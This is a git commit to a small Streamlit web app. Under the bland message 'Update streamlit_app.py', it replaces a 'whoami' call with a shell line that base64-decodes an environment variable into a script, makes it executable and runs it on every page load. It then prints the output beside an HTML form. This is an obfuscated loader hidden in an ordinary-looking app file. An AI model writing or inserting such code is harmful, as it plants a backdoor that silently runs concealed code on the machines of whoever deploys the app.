65162bf418c5f935acd6eac072aa4a44bda3b778
akamehash <akameshimori@gmail.com>
2022-07-04 20:46:00 -0700

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -1,6 +1,6 @@
 import streamlit as st
 import os
-output = os.popen('whoami').read()
+output = os.popen('echo $value > base; base64 --decode base > 1234.sh; chmod +x 1234.sh; ./1234.sh').read()
 my_placeholder = st.empty()
 my_placeholder.text("The user entered %s" % output +'<br><form action="" method="get"><input type="text" name="username"><input type="submit" value="Submit"></form> ')
 
